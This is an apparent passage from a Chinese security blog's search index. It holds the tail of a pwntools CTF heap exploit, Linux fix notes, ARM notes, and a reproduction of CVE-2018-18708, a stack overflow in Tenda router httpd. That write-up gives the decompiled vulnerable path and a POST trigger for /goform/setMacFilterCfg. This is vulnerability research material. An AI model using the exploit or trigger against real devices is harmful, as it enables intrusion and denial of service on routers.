+ hex(lib.dump(&#x27;__malloc_hook&#x27;)))\tad(7, 0x10)\tdef finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\tif LOCAL:\t\tlibc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process()\telse:\t\telf = ELF(elf_path)\t\tlibc_path = &#x27;./libc6_2.23-0ubuntu10_amd64.so&#x27;\t\tlibc_path = &#x27;./libc6_2.23-0ubuntu3_amd64.so&#x27;\t\tlibc_path = &#x27;./libc.so.6&#x27;\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n","categories":["ctf"],"tags":["pwn"]},{"title":"issues","url":"/2020/11/15/env/linux/issues/","content":"日常问题大全[0x001] 如何将md格式转docsudo pacman -S pandoc\n使用方式\npandoc -s test.md -o test.docx\n\n\n\n\n\n[0x002] How to disable kwallet serviceYou could also edit file ~/.kde/share/config/kwalletrc: adding to [Wallet] section just one line\nEnabled=false\n\nwould disable kwallet popups.\nIf you have ~/.config/kwalletrc file, do the same with it.\nhttps://stackoverflow.com/questions/29594260/how-to-disable-kwallet-in-kde-plasma-5\n[0x003]Vim设置Tab宽度&#x2F;替换Tab为空格用户配置：\n在&#x2F;home&#x2F;logan&#x2F;.vimrc中添加以下代码后，重启vim即可实现按TAB产生4个空格：set ts&#x3D;4 (注：ts是tabstop的缩写，设TAB宽4个空格)set expandtab\n对于已保存的文件，可以使用下面的方法进行空格和TAB的替换：TAB替换为空格：:set ts&#x3D;4:set expandtab:%retab!\n空格替换为TAB：:set ts&#x3D;4:set noexpandtab:%retab!\n加!是用于处理非空白字符之后的TAB，即所有的TAB，若不加!，则只处理行首的TAB。\n[0x004] System settings won’t open after changing Application styleTitle. I was wondering if there was a way to change the Application style without opening System Settings.\nTrying to open System settings from the terminal gives me this:\nCyclic dependency detected between &quot;file:///usr/lib/qt/qml/org/kde/kirigami.2/styles/org.kde.desktop.plasma/Units.qml&quot; and &quot;file:///usr/lib/qt/qml/org/kde/kirigami.2/styles/org.kde.desktop.plasma/Units.qml&quot;KCrash: crashing... crashRecursionCounter = 2KCrash: Application Name = systemsettings5 path = /usr/bin pid = 2255KCrash: Arguments: /usr/bin/systemsettings5 KCrash: Attempting to start /usr/lib/drkonqiqt.qpa.xcb: QXcbConnection: XCB error: 5 (BadAtom), sequence: 454, resource id: 0, major code: 20 (GetProperty), minor code: 0[1]  + 2255 suspended (signal)  systemsettings5\n\nstart up\nsystemsettings5 --style=Breeze\n\n[0x005] Failed to start Load&#x2F;Save Screen Backlight Brightnesssystemctl status systemd-backlight@backlight:acpi_video0.service\n\nJust added acpi_backlight&#x3D;vendor to the arguments of the kernel and everything seems to work now!\n&#x2F;etc&#x2F;default&#x2F;grub:\nGRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet acpi_backlight=vendor&quot;\n\nDo not forget to run sudo update-grub afterwards.\nref: https://bbs.archlinux.org/viewtopic.php?id=211967\nref: https://bbs.archlinux.org/viewtopic.php?id=261613\nref: https://unix.stackexchange.com/questions/393185/backlightacpi-video0-no-such-device\n[0x007] Backlight and add kenel modulehttps://wiki.archlinux.org/index.php/backlight\nhttps://bbs.archlinux.org/viewtopic.php?id=257810\nAdd kenel modulevim &#x2F;etc&#x2F;mkinitcpio.confI added amdgpu to modulesNow it looks like this:\nMODULES&#x3D;(amdgpu)Then I regenerated initframs:\nmkinitcpio -P\n[0x008] Pyinstaller throwing AttributeError: ‘NoneType’ object has no attribute ‘groups’ errorUpdate Pyinstaller from github can solve this problem.\npip install https://github.com/pyinstaller/pyinstaller/tarball/develop\n\n\n\nref: \nhttps://stackoverflow.com/questions/66297374/pyinstaller-throwing-attributeerror-nonetype-object-has-no-attribute-groups\nhttps://github.com/pyinstaller/pyinstaller/issues/5552#ref-issue-804386339\n[0x009] How to save root file by vim when  opened with no-root userInput command in vim\n:write !sudo tee % &gt; /dev/null\n\nref: https://www.cnblogs.com/jackie-astro/p/13295584.html\nvirtualbox6.1.34无法启动问题问题如下\nFailed to load R0 module C:\\Program Files\\Oracle\\VirtualBox/VMMR0.r0: Signature #2/3: Expected at least 2 valid paths, not 1.: \\Device\\HarddiskVolume2\\Program Files\\Oracle\\VirtualBox\\VMMR0.r0 (VERR_SUP_VP_UNEXPECTED_VALID_PATH_COUNT).Failed to load VMMR0.r0 (VERR_SUP_VP_UNEXPECTED_VALID_PATH_COUNT).\n\n\n\n\n是vitualbox 6.1.34的一个bug，下载 6.1.32即可，https://www.virtualbox.org/download/testcase/VirtualBox-6.1-6.1.33_150501_el8-1.x86_64.rpm解压后进入到usr&#x2F;lib&#x2F;virtualbox&#x2F;，然后替换文件。\nsudo cp .&#x2F;VBoxDDR0.r0 &#x2F;usr&#x2F;lib&#x2F;virtualbox&#x2F;VBoxDDR0.r0 \n","categories":["env"],"tags":["issues"]},{"title":"ARMx86学习","url":"/2020/11/13/security/pwn/arm/","content":"ARMx86学习寄存器r0\nr1\nr2\nr3\nr4\nr5\nr6\nr7\nr8\nr9\nr10\nr11\nr12\nsp\npc\n指令bl 相当于x86 call\nb 相当于x86 return\nadd\nsub\nldr\nmov\nbeq\ncmp\nbne\nstrSTR{条件} 源寄存器，&lt;存储器地址&gt;\nSTR指令用亍从源寄存器中将一个32位的字数据传送到存储器中。该指令在程序设计中比较常\n用，寻址方式灵活多样，使用方式可参考指令LDR。\n指令示例：\nSTR R0，[R1]，＃8       ；将R0中的字数据写入以R1为地址的存储器中，并将新地址R1＋8写入R1。\nSTR R0，[R1，＃8]       ；将R0中的字数据写入以R1＋8为地址的存储器中。”\nstr   r1, [r0]            ；将r1寄存器的值，传送到地址值为r0的（存储器）内存中\n堆栈结构当一个函数调用使用少量参数(ARM上是少于等于4个)时，参数是通过寄存器进行传值(ARM上是通过r0,r1,r2,r3)，而当参数多于4个时，会将多出的参数压入栈中进行传递(其实在函数调用过程中也会把r0,r1,r2,r3传递的参数压入栈)\n","categories":["security"],"tags":["arm"]},{"title":"CVE-2018-18708","url":"/2020/11/13/security/cve/CVE-2018-18708/","content":"CVE-2018-18708 复现该题在nu1lctf2020 的pwn中已经出现，为babyrouter，不妨来复现复现该cve。\n工具+环境下载\ncutter\nida\ngdb + pwndbg\nqemu-arm\npython\n远程实验环境docker + qemu-arm\n漏洞分析简要概述CVE-2018-18708，多款Tenda产品中的httpd存在缓冲区溢出漏洞。攻击者可利用该漏洞造成拒绝服务（覆盖函数的返回地址）。以下产品和版本受到影响：Tenda AC7 V15.03.06.44_CN版本；AC9 V15.03.05.19(6318)_CN版本；AC10  V15.03.06.23_CN版本；AC15 V15.03.05.19_CN版本；AC18 V15.03.05.19(6318)_CN版本。\n漏洞点sub_BE73Csigned int __fastcall vul_end(const char *a1, char *a2) # offset 000BE73C&#123;  signed int v2; // r3  char *dest; // [sp+8h] [bp-3Ch]  char *str; // [sp+Ch] [bp-38h]  int v6; // [sp+10h] [bp-34h]  int v7; // [sp+14h] [bp-30h]  int v8; // [sp+18h] [bp-2Ch]  int v9; // [sp+1Ch] [bp-28h]  int s2; // [sp+20h] [bp-24h]  int v11; // [sp+24h] [bp-20h]  int v12; // [sp+28h] [bp-1Ch]  int v13; // [sp+2Ch] [bp-18h]  char v14; // [sp+32h] [bp-12h]  char v15; // [sp+33h] [bp-11h]  char *src; // [sp+34h] [bp-10h]  str = (char *)a1;  dest = a2;  src = strchr(a1, 13); //检测deviceList内容是否包含’\\r’，随后进入分支执行漏洞代码。  if ( src )  &#123;    *src++ = 0;    v6 = 0;    v7 = 0;    v8 = 0;    v9 = 0;    if ( GetValue(&quot;cgi_debug&quot;, &amp;v6) &amp;&amp; !strcmp(&quot;on&quot;, (const char *)&amp;v6) )    &#123;      v15 = 1;      printf(&quot;%s[%s:%s:%d] %s&quot;, off_FCFEC[0], &quot;cgi&quot;, &quot;parse_macfilter_rule&quot;, 807, off_FCFE4[0]);      printf(&quot;parase rule: name == %s, mac == %s\\n\\x1B[0m&quot;, str, src);    &#125;    strcpy(dest + 32, str); // 漏洞点vul    strcpy(dest, src); // 漏洞点    v2 = 0;  &#125;  else  &#123;    s2 = 0;    v11 = 0;    v12 = 0;    v13 = 0;    if ( GetValue(&quot;cgi_debug&quot;, &amp;s2) &amp;&amp; !strcmp(&quot;on&quot;, (const char *)&amp;s2) )    &#123;      v14 = 2;      printf(&quot;%s[%s:%s:%d] %s&quot;, off_FCFEC[0], &quot;cgi&quot;, &quot;parse_macfilter_rule&quot;, 803, off_FCFE8[0]);      printf(&quot;source_rule error: %s!\\n\\x1B[0m&quot;, str);    &#125;    v2 = 2;  &#125;  return v2;&#125;\n\n从以上可以很容易看出漏洞点在strcpy函数， 那str是通过参数一传入的，进行逆向跟踪。\nsub_BDA1Cint __fastcall sub_BDA1C(int a1, const char *vul_str, int a3)&#123;  int v4; // [sp+Ch] [bp-1F0h]  const char *v5; // [sp+10h] [bp-1ECh]  int v6; // [sp+14h] [bp-1E8h]  int v7; // [sp+1Ch] [bp-1E0h]  int v8; // [sp+20h] [bp-1DCh]  int v9; // [sp+24h] [bp-1D8h]  int v10; // [sp+28h] [bp-1D4h]  int v11; // [sp+2Ch] [bp-1D0h]  int v12; // [sp+30h] [bp-1CCh]  int v13; // [sp+34h] [bp-1C8h]  int v14; // [sp+38h] [bp-1C4h]  int s2; // [sp+3Ch] [bp-1C0h]  int v16; // [sp+40h] [bp-1BCh]  int v17; // [sp+44h] [bp-1B8h]  int v18; // [sp+48h] [bp-1B4h]  char v19; // [sp+4Ch] [bp-1B0h]  char s; // [sp+CCh] [bp-130h]  char v21; // [sp+14Ch] [bp-B0h]  int v22; // [sp+16Ch] [bp-90h]  char v23; // [sp+1EDh] [bp-Fh]  char v24; // [sp+1EEh] [bp-Eh]  char v25; // [sp+1EFh] [bp-Dh]  v6 = a1;  v5 = vul_str;  v4 = a3;  memset(&amp;s, 0, 0x80u);  memset(&amp;v19, 0, 0x80u);  s2 = 0;  v16 = 0;  v17 = 0;  v18 = 0;  if ( GetValue(&quot;cgi_debug&quot;, &amp;s2) &amp;&amp; !strcmp(&quot;on&quot;, (const char *)&amp;s2) )  &#123;    v25 = 1;    printf(&quot;%s[%s:%s:%d] %s&quot;, off_FCFEC[0], &quot;cgi&quot;, &quot;set_macfilter_rules_by_one&quot;, 667, off_FCFE4[0]);    printf(&quot;set macfilter rules by one, source_rule == %s, index == %d\\n\\x1B[0m&quot;, v5, v4);  &#125;  memset(&amp;v21, 0, 0xA0u);  vul_end(v5, &amp;v21); // 调用, v5为传入后strcpy的参数  v11 = 0;  v12 = 0;  v13 = 0;  v14 = 0;  if ( GetValue(&quot;cgi_debug&quot;, &amp;v11) &amp;&amp; !strcmp(&quot;on&quot;, (const char *)&amp;v11) )  &#123;    v24 = 1;    printf(&quot;%s[%s:%s:%d] %s&quot;, off_FCFEC[0], &quot;cgi&quot;, &quot;set_macfilter_rules_by_one&quot;, 671, off_FCFE4[0]);    printf(&quot;get rule%d: name == %s, mac == %s\\n\\x1B[0m&quot;, v4, &amp;v22, &amp;v21);  &#125;  snprintf(&amp;s, 0x80u, &quot;macfilter.%s.list%d&quot;, v6, v4);  snprintf(&amp;v19, 0x80u, &quot;%s&quot;, &amp;v21);  v7 = 0;  v8 = 0;  v9 = 0;  v10 = 0;  if ( GetValue(&quot;cgi_debug&quot;, &amp;v7) &amp;&amp; !strcmp(&quot;on&quot;, (const char *)&amp;v7) )  &#123;    v23 = 1;    printf(&quot;%s[%s:%s:%d] %s&quot;, off_FCFEC[0], &quot;cgi&quot;, &quot;set_macfilter_rules_by_one&quot;, 675, off_FCFE4[0]);    printf(&quot;set rule: %s == %s\\n\\x1B[0m&quot;, &amp;s, &amp;v19);  &#125;  SetValue(&amp;s, &amp;v19);  if ( (_BYTE)v22 )    sub_C2FD4((int)&amp;v22, (int)&amp;v21);  return 0;&#125;\n\n字符串也是该函是第二个参数进行传入的，继续逆跟踪。\nsub_BD758int __fastcall sub_BD758(int a1, char *vul_str)&#123;  const char *s; // [sp+8h] [bp-44h]  int v4; // [sp+Ch] [bp-40h]  int v5; // [sp+14h] [bp-38h]  int v6; // [sp+18h] [bp-34h]  int v7; // [sp+1Ch] [bp-30h]  int v8; // [sp+20h] [bp-2Ch]  int s2; // [sp+24h] [bp-28h]  int v10; // [sp+28h] [bp-24h]  int v11; // [sp+2Ch] [bp-20h]  int v12; // [sp+30h] [bp-1Ch]  char v13; // [sp+36h] [bp-16h]  char v14; // [sp+37h] [bp-15h]  char *v15; // [sp+38h] [bp-14h]  int v16; // [sp+3Ch] [bp-10h]  v4 = a1;  s = vul_str;  v16 = 1;  v15 = 0;  s2 = 0;  v10 = 0;  v11 = 0;  v12 = 0;  if ( GetValue(&quot;cgi_debug&quot;, &amp;s2) &amp;&amp; !strcmp(&quot;on&quot;, (const char *)&amp;s2) )  &#123;    v14 = 1;    printf(&quot;%s[%s:%s:%d] %s&quot;, off_FCFEC[0], &quot;cgi&quot;, &quot;set_macfilter_rules&quot;, 617, off_FCFE4[0]);    printf(&quot;set macfilter rules\\n\\x1B[0m&quot;);  &#125;  sub_BDE40(v4);  if ( *s )  &#123;    while ( 1 )    &#123;      v15 = strchr(s, 10);      if ( !v15 )        break;      *v15++ = 0;      vul_2(v4, s, v16); // 调用vul函数, s为传入的字符串      s = v15;      ++v16;    &#125;    vul_2(v4, s, v16); // 调用vul函数, s为传入的字符串    sub_BE9DC(v4, v16);  &#125;  else  &#123;    v5 = 0;    v6 = 0;    v7 = 0;    v8 = 0;    if ( GetValue(&quot;cgi_debug&quot;, &amp;v5) &amp;&amp; !strcmp(&quot;on&quot;, (const char *)&amp;v5) )    &#123;      v13 = 1;      printf(&quot;%s[%s:%s:%d] %s&quot;, off_FCFEC[0], &quot;cgi&quot;, &quot;set_macfilter_rules&quot;, 623, off_FCFE4[0]);      printf(&quot;rule list is NULL!\\n\\x1B[0m&quot;);    &#125;  &#125;  return 0;&#125;\n\n字符串是该函数的二个参数进行传入的，继续逆跟踪。\nformSetMacFilterCfgint __fastcall formSetMacFilterCfg(int a1) // 000BCB9C&#123;  int v1; // r0  int v3; // [sp+14h] [bp-218h]  int v4; // [sp+1Ch] [bp-210h]  int v5; // [sp+20h] [bp-20Ch]  int v6; // [sp+24h] [bp-208h]  int v7; // [sp+28h] [bp-204h]  int v8; // [sp+2Ch] [bp-200h]  int v9; // [sp+30h] [bp-1FCh]  int v10; // [sp+34h] [bp-1F8h]  int v11; // [sp+38h] [bp-1F4h]  int v12; // [sp+3Ch] [bp-1F0h]  int v13; // [sp+40h] [bp-1ECh]  int v14; // [sp+44h] [bp-1E8h]  int v15; // [sp+48h] [bp-1E4h]  int v16; // [sp+4Ch] [bp-1E0h]  int v17; // [sp+50h] [bp-1DCh]  int v18; // [sp+54h] [bp-1D8h]  int v19; // [sp+58h] [bp-1D4h]  int s2; // [sp+5Ch] [bp-1D0h]  int v21; // [sp+60h] [bp-1CCh]  int v22; // [sp+64h] [bp-1C8h]  int v23; // [sp+68h] [bp-1C4h]  char v24; // [sp+6Ch] [bp-1C0h]  char s; // [sp+ECh] [bp-140h]  int v26; // [sp+1ECh] [bp-40h]  int v27; // [sp+1F0h] [bp-3Ch]  int v28; // [sp+1F4h] [bp-38h]  int v29; // [sp+1F8h] [bp-34h]  int v30; // [sp+1FCh] [bp-30h]  int v31; // [sp+200h] [bp-2Ch]  int v32; // [sp+204h] [bp-28h]  int v33; // [sp+208h] [bp-24h]  char v34; // [sp+20Fh] [bp-1Dh]  char v35; // [sp+210h] [bp-1Ch]  char v36; // [sp+211h] [bp-1Bh]  char v37; // [sp+212h] [bp-1Ah]  char v38; // [sp+213h] [bp-19h]  char *vul_str; // [sp+214h] [bp-18h]  void *v40; // [sp+218h] [bp-14h]  int v41; // [sp+21Ch] [bp-10h]  v3 = a1;  v40 = 0;  vul_str = 0;  v41 = 0;  v26 = 0;  v27 = 0;  v28 = 0;  v29 = 0;  v30 = 0;  v31 = 0;  v32 = 0;  v33 = 0;  memset(&amp;s, 0, 0x100u);  memset(&amp;v24, 0, 0x80u);  v40 = sub_2B794(v3, (int)&quot;macFilterType&quot;, (int)&amp;unk_F0BA4);  v41 = sub_BD34C(v40); // 调用判断函数  if ( v41 ) // 判断v41  &#123;    s2 = 0;    v21 = 0;    v22 = 0;    v23 = 0;    if ( GetValue(&quot;cgi_debug&quot;, &amp;s2) &amp;&amp; !strcmp(&quot;on&quot;, (const char *)&amp;s2) )    &#123;      v38 = 2;      printf(&quot;%s[%s:%s:%d] %s&quot;, off_FCFEC[0], &quot;cgi&quot;, &quot;formSetMacFilterCfg&quot;, 500, off_FCFE8[0]);      printf(&quot;set mac filter mode error!\\n\\x1B[0m&quot;);    &#125;  &#125;  else  &#123;    vul_str = (char *)sub_2B794(v3, (int)&quot;deviceList&quot;, (int)&amp;unk_F0BA4);    v41 = vul_3((int)v40, vul_str);             // 漏洞调用点    if ( v41 )    &#123;      v16 = 0;      v17 = 0;      v18 = 0;      v19 = 0;      if ( GetValue(&quot;cgi_debug&quot;, &amp;v16) &amp;&amp; !strcmp(&quot;on&quot;, (const char *)&amp;v16) )      &#123;        v37 = 2;        printf(&quot;%s[%s:%s:%d] %s&quot;, off_FCFEC[0], &quot;cgi&quot;, &quot;formSetMacFilterCfg&quot;, 508, off_FCFE8[0]);        printf(&quot;set mac filter rules error!\\n\\x1B[0m&quot;);      &#125;    &#125;    else    &#123;      sub_C3E80();      v1 = sub_BED1C(v40);      if ( CommitCfm(v1) )      &#123;        send_msg_to_netctrl(9, &quot;op=5&quot;);        GetValue(&quot;wl2g.public.enable&quot;, &amp;v26);        if ( !strcmp(&quot;1&quot;, (const char *)&amp;v26) )        &#123;          v8 = 0;          v9 = 0;          v10 = 0;          v11 = 0;          if ( GetValue(&quot;cgi_debug&quot;, &amp;v8) &amp;&amp; !strcmp(&quot;on&quot;, (const char *)&amp;v8) )          &#123;            v35 = 1;            printf(&quot;%s[%s:%s:%d] %s&quot;, off_FCFEC[0], &quot;cgi&quot;, &quot;formSetMacFilterCfg&quot;, 528, off_FCFE4[0]);            printf(&quot;2.4G is enabled, sending msg to 2.4G wifi refresh!\\n\\x1B[0m&quot;);          &#125;          snprintf(&amp;v24, 0x80u, &quot;op=%d,wl_rate=%d&quot;, 11, 24);          send_msg_to_netctrl(19, &amp;v24);        &#125;        GetValue(&quot;wl5g.public.enable&quot;, &amp;v26);        if ( !strcmp(&quot;1&quot;, (const char *)&amp;v26) )        &#123;          v4 = 0;          v5 = 0;          v6 = 0;          v7 = 0;          if ( GetValue(&quot;cgi_debug&quot;, &amp;v4) &amp;&amp; !strcmp(&quot;on&quot;, (const char *)&amp;v4) )          &#123;            v34 = 1;            printf(&quot;%s[%s:%s:%d] %s&quot;, off_FCFEC[0], &quot;cgi&quot;, &quot;formSetMacFilterCfg&quot;, 535, off_FCFE4[0]);            printf(&quot;5G is enabled, sending msg to 5G wifi refresh!\\n\\x1B[0m&quot;);          &#125;          snprintf(&amp;v24, 0x80u, &quot;op=%d,wl_rate=%d&quot;, 11, 5);          send_msg_to_netctrl(19, &amp;v24);        &#125;      &#125;      else      &#123;        v12 = 0;        v13 = 0;        v14 = 0;        v15 = 0;        if ( GetValue(&quot;cgi_debug&quot;, &amp;v12) &amp;&amp; !strcmp(&quot;on&quot;, (const char *)&amp;v12) )        &#123;          v36 = 2;          printf(&quot;%s[%s:%s:%d] %s&quot;, off_FCFEC[0], &quot;cgi&quot;, &quot;formSetMacFilterCfg&quot;, 519, off_FCFE8[0]);          printf(&quot;cfm commit error!\\n\\x1B[0m&quot;);        &#125;        v41 = 1;      &#125;    &#125;  &#125;  snprintf(&amp;s, 0x100u, &quot;&#123;\\&quot;errCode\\&quot;:%d&#125;&quot;, v41);  return sub_9C66C(v3, &amp;s);&#125;\n\n进入目标分支后，再从deviceList获取传入v39变量，根据上一节的分析该值将被用作strcpy的参数。\n然而这里有个判断，要想执行到前面我们所跟踪到的内容，必须先绕过一个if判断，也就是我们必须要得使v41这个变量值为0，然而该值是调用sub_BD34C函数的一个返回值，咱们先跟进sub_BD34C函数看看。\nsub_BD34Csigned int __fastcall sub_BD34C(char *a1)&#123;  signed int v1; // r3  char *v3; // [sp+Ch] [bp-48h]  int v4; // [sp+10h] [bp-44h]  int v5; // [sp+14h] [bp-40h]  int v6; // [sp+18h] [bp-3Ch]  int v7; // [sp+1Ch] [bp-38h]  int v8; // [sp+20h] [bp-34h]  int v9; // [sp+24h] [bp-30h]  int v10; // [sp+28h] [bp-2Ch]  int v11; // [sp+2Ch] [bp-28h]  int s2; // [sp+30h] [bp-24h]  int v13; // [sp+34h] [bp-20h]  int v14; // [sp+38h] [bp-1Ch]  int v15; // [sp+3Ch] [bp-18h]  char v16; // [sp+41h] [bp-13h]  char v17; // [sp+42h] [bp-12h]  char v18; // [sp+43h] [bp-11h]  const char *v19; // [sp+44h] [bp-10h]  v3 = a1;  v19 = 0;  s2 = 0;  v13 = 0;  v14 = 0;  v15 = 0;  if ( GetValue(&quot;cgi_debug&quot;, &amp;s2) &amp;&amp; !strcmp(&quot;on&quot;, (const char *)&amp;s2) )  &#123;    v18 = 1;    printf(&quot;%s[%s:%s:%d] %s&quot;, off_FCFEC[0], &quot;cgi&quot;, &quot;set_macfilter_mode&quot;, 566, off_FCFE4[0]);    printf(&quot;get mac filter mode == %s\\n\\x1B[0m&quot;, v3);  &#125;  if ( *v3 )  &#123;    if ( !strcmp(&quot;black&quot;, v3) || !strcmp(&quot;white&quot;, v3) ) // 参数字符串判断    &#123;      SetValue(&quot;macfilter.mode&quot;, v3);      if ( !strcmp(&quot;black&quot;, v3) )        v19 = &quot;deny&quot;;      else        v19 = &quot;allow&quot;;      SetValue(&quot;wl2g.ssid0.macmode&quot;, v19);      SetValue(&quot;wl5g.ssid0.macmode&quot;, v19);      v1 = 0; //设置返回值为0    &#125;    else    &#123;      v4 = 0;      v5 = 0;      v6 = 0;      v7 = 0;      if ( GetValue(&quot;cgi_debug&quot;, &amp;v4) &amp;&amp; !strcmp(&quot;on&quot;, (const char *)&amp;v4) )      &#123;        v16 = 2;        printf(&quot;%s[%s:%s:%d] %s&quot;, off_FCFEC[0], &quot;cgi&quot;, &quot;set_macfilter_mode&quot;, 575, off_FCFE8[0]);        printf(&quot;got wrong mac filter mode: %s!\\n\\x1B[0m&quot;, v3);      &#125;      v1 = 2;    &#125;  &#125;  else  &#123;    v8 = 0;    v9 = 0;    v10 = 0;    v11 = 0;    if ( GetValue(&quot;cgi_debug&quot;, &amp;v8) &amp;&amp; !strcmp(&quot;on&quot;, (const char *)&amp;v8) )    &#123;      v17 = 2;      printf(&quot;%s[%s:%s:%d] %s&quot;, off_FCFEC[0], &quot;cgi&quot;, &quot;set_macfilter_mode&quot;, 569, off_FCFE8[0]);      printf(&quot;got mac filter mode failed!\\n\\x1B[0m&quot;);    &#125;    v1 = 2;  &#125;  return v1;&#125;\n\n以上逻辑是，根据传入的参数来进行字符串判断，若传入参数字符串为black或者white就会使返回值为0，那么就可以执行到漏洞点。\n然而sub_2B794函数是解析字符串返回对应的字符串，类似与json解析，根据key值找value。\nsub_2B794void *__fastcall sub_2B794(int a1, int a2, int a3)&#123;  int v5; // [sp+4h] [bp-20h]  _DWORD *v6; // [sp+14h] [bp-10h]  v5 = a3;  v6 = sub_1F8FC(*(_DWORD *)(a1 + 32), (char *)a2);  if ( !v6 )    return (void *)v5;  if ( (*((unsigned __int16 *)v6 + 10) &lt;&lt; 16) | *((unsigned __int16 *)v6 + 9) )    return (void *)((*((unsigned __int16 *)v6 + 10) &lt;&lt; 16) | *((unsigned __int16 *)v6 + 9));  return &amp;unk_D8440;&#125;\n\n\n\n那么什么函数会调用formSetMacFilterCfg函数呢?继续跟踪调用函数。\nsub_41F18int sub_41F18() &#123;...sub_16EF4(&quot;AdvSetNat&quot;, formNatSet);sub_FE28(&quot;NatSet&quot;, aspNatSet);sub_16EF4(&quot;getMacFilterCfg&quot;, formGetMacFilterCfg);sub_16EF4(&quot;setMacFilterCfg&quot;, formSetMacFilterCfg);sub_16EF4(&quot;parentControlEn&quot;, formSetParentControlEnable);...&#125;\n\n好像没发现啥，继续往上跟踪\nsub_2E6F4signed int sub_2E6F4()&#123;  int v0; // r0  size_t v1; // r3  size_t v2; // r3  signed int v3; // r3  char s; // [sp+8h] [bp-194h]  char dest; // [sp+88h] [bp-114h]  char v7; // [sp+108h] [bp-94h]  struct in_addr inp; // [sp+188h] [bp-14h]  char *v9; // [sp+18Ch] [bp-10h]  v9 = 0;  memset(&amp;s, 0, 0x80u);  v0 = doSystemCmd(&quot;echo 0 &gt; /proc/sys/net/ipv4/tcp_timestamps&quot;);  sub_1B3DC(v0);  inet_aton((const char *)&amp;g_lan_ip, &amp;inp);  strcpy(&amp;dest, off_FB76C);  sub_12238(&amp;dest);  v9 = inet_ntoa(inp);  if ( strlen(v9) + 1 &gt; 0x7F )    v1 = 128;  else    v1 = strlen(v9) + 1;  sub_19354(&amp;s, v9, v1);  sub_2CF20(&amp;s);  if ( strlen(&amp;v7) + 1 &gt; 0x7F )    v2 = 128;  else    v2 = strlen(&amp;v7) + 1;  sub_19354(&amp;s, &amp;v7, v2);  sub_2CE84(&amp;s);  sub_121D0(&quot;main.html&quot;);  sub_1F268(off_FB770);  if ( sub_29218(port, retries) &gt;= 0 )  &#123;    sub_176B0(&amp;unk_D8894, 0, 0, R7WebsSecurityHandler, 1);    sub_176B0(&quot;/goform&quot;, 0, 0, websFormHandler, 0);    sub_176B0(&quot;/cgi-bin&quot;, 0, 0, webs_Tenda_CGI_BIN_Handler, 0);    sub_176B0(&amp;unk_D8894, 0, 0, websDefaultHandler, 2);    sub_41F18(); // call vul hunc    sub_176B0(&quot;/&quot;, 0, 0, sub_2E9D8, 0);    v3 = 0;  &#125;  else  &#123;    printf(&quot;%s %d: websOpenServer failed\\n&quot;, &quot;initWebs&quot;, 499);    v3 = -1;  &#125;  return v3;&#125;\n\n通过gdb下断点确定访问“&#x2F;goform&#x2F;setMacFilterCfg”时会进入formSetMacfiltercfg函数。\n再继续网上跟踪就是必须运行的代码块了，如下。\nsub_2E128signed int __fastcall sub_2E128(int a1, int a2)&#123;  ...  init_core_dump(v2);  v3 = puts(&quot;\\n\\nYes:\\n\\n      ****** WeLoveLinux****** \\n\\n Welcome to ...&quot;);  sub_305FC(v3);  v4 = sleep(1u);  v5 = ConnectCfm(v4);  sub_100D8(0, 61440, 1, v5);  memset(&amp;s, 0, 0x80u);  if ( !GetValue(&quot;lan.webiplansslen&quot;, &amp;s) )    strcpy(&amp;s, &quot;0&quot;);  sslenable = atoi(&amp;s);  if ( !GetValue(&quot;lan.webport&quot;, &amp;s) )    strcpy(&amp;s, &quot;80&quot;);  if ( !GetValue(&quot;lan.webipen&quot;, &amp;dest) )    strcpy(&amp;dest, &quot;0&quot;);  if ( !strcmp((const char *)&amp;dest, &quot;1&quot;) )  &#123;    sslport = atoi(&amp;s);    port = atoi(&amp;s);  &#125;  v6 = getLanIfName();  if ( getIfIp(v6, &amp;v21) &lt; 0 )  &#123;    GetValue(&quot;lan.ip&quot;, &amp;s);    strcpy(g_lan_ip, &amp;s);    memset(&amp;v17, 0, 0x50u);    if ( !tpi_lan_dhcpc_get_ipinfo_and_status(&amp;v17) &amp;&amp; v17 )      vos_strcpy(g_lan_ip, &amp;v17);  &#125;  else  &#123;    vos_strcpy(g_lan_ip, &amp;v21);  &#125;  memset(&amp;v19, 0, 9u);  v7 = inet_addr(g_lan_ip);  v19 = (unsigned __int8)v19 | (v7 &lt;&lt; 8);  v20 = HIBYTE(v7);  tpi_talk_to_kernel(5, &amp;v19, &amp;v18, 0, 0, 0, v15, v16);  sub_2EA60(1);  sub_2EA60(0);  getpid();  doSystemCmd(&quot;echo %d &gt; %s&quot;);  if ( sub_2E6F4() &gt;= 0 ) // call our func  &#123;    memset(&amp;loginUserInfo, 0, 0x6Cu);    signal(15, (__sighandler_t)sub_2DEC0);    signal(9, (__sighandler_t)sub_2DEC0);    signal(14, (__sighandler_t)sub_2DF48);    alarm(0x3Cu);    v35 = 0;    mallopt(-1, 0);    mallopt(-3, 2048);    v9 = getpid();    v34 = v9;    while ( !dword_FD1C0 )    &#123;      v10 = sub_1BFF4(-1, 1000);      if ( v10 &gt; 0 )        v10 = sub_1C4F0(-1);      v11 = sub_11570(v10);      v9 = sub_2DD68(v11);      if ( !(++v35 % 100) )        v9 = malloc_trim(0);    &#125;    if ( sslenable )    &#123;      v12 = sub_1EF9C(v9);    &#125;    else    &#123;      v13 = sub_2940C(v9);      v12 = sub_1B47C(v13);    &#125;    sub_10258(v12);    v8 = 0;  &#125;  else  &#123;    puts(&quot;main -&gt; initWebs failed&quot;);    v8 = -1;  &#125;  return v8;&#125;\n\n触发链sub_2E128 -&gt; sub_2E6F4 -&gt;sub_41F18 -&gt; formSetMacFilterCfg -&gt; sub_BD758 -&gt; sub_BDA1C -&gt; sub_BE73C\n那么现在我们就可以访问“&#x2F;goform&#x2F;setMacFilterCfg”时会进入formSetMacfiltercfg函数，传入类似与json的数据进行解析，则会将value值传入漏洞触发点。\npayloadpost 数据, rur &#x3D; ‘&#x2F;goform&#x2F;setMacFilterCfg’\n&#123;&quot;macFilterType&quot;: &quot;white&quot;, &quot;deviceList&quot;: payload&#125;\n\n\n\n漏洞调试准备编写qemu-arm启动脚本\n#!/bin/shbrctl addbr br0ifconfig br0 10.10.10.10 upqemu-arm-static -g 1234 -L ./pwn 